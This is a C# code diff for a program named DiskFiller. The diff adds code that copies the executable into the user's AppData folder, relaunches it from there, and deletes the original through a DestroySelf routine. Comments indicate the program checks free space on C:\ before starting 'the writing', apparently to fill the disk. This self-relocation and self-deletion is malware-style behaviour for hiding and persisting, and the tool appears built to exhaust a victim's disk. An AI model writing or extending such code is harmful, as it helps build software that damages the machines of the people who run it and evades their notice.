@@ -1,6 +1,7 @@
 ﻿using System;
 using System.IO;
 using System.Linq;
+using System.Threading;
 using System.Diagnostics;
 using System.Windows.Forms;
 
@@ -27,6 +28,10 @@ namespace DiskFiller
 
         internal DiskFiller()
         {
+            InitializeComponent();
+
+
+
             // Check if application should run
             if (GetFreeDiskSpace(@"C:\") <= 4)
             {
@@ -41,10 +46,27 @@ namespace DiskFiller
 
 
 
-            // Check if file is not in wanted folder
-                // Copy application to appdata
-                // Start application from new folder
-                // Exit and destroy current application
+            // Check if current path is the wanted path
+            if (finalPaths.currentFolder.Equals(finalPaths.appdata) == false)
+            {
+                string newApplicationPath = $@"{finalPaths.appdata}\{applicationName}";
+
+                // Copy application from the current path to appdata
+                CopyFile(finalPaths.currentFullPath, newApplicationPath);
+
+                Thread.Sleep(1000);
+
+                // Start from the new path
+                try
+                {
+                    Process.Start(newApplicationPath);
+                }
+                catch { }
+
+                Thread.Sleep(2000);
+
+                DestroySelf();
+            }
 
 
 
@@ -53,10 +75,6 @@ namespace DiskFiller
 
 
             // Start the writing
-
-
-
-            InitializeComponent();
         }
 
 
@@ -64,6 +82,8 @@ namespace DiskFiller
         /// <summary>
         /// Gets the free space of a disk with a given name
         /// </summary>
+        /// 
+        /// <param name="diskName"> For example -> "C:\" or "D:\" </param>
         /// 
         /// <returns>
         /// The free disk space in gb
@@ -130,6 +150,29 @@ namespace DiskFiller
             appPaths.currentFolder = appPaths.currentFolder.Substring(0, appPaths.currentFolder.Length - 1);
 
             return appPaths;
+        }
+
+        /// <summary>
+        /// Copies a file from one path to another
+        /// </summary>
+        /// 
+        /// <param name="sourcePath"> Path from which the file should be copied </param>
+        /// <param name="targetPath"> The new path where the file will land </param>
+        private void CopyFile(string sourcePath, string targetPath)
+        {
+            try
+            {
+                // Make sure that no file exists already because this could lead to an exception
+                File.Delete(targetPath);
+
+                Thread.Sleep(500);
+
+                File.Copy(sourcePath, targetPath);
+            }
+            catch
+            {
+                DestroySelf();
+            }
         }
     }
 }
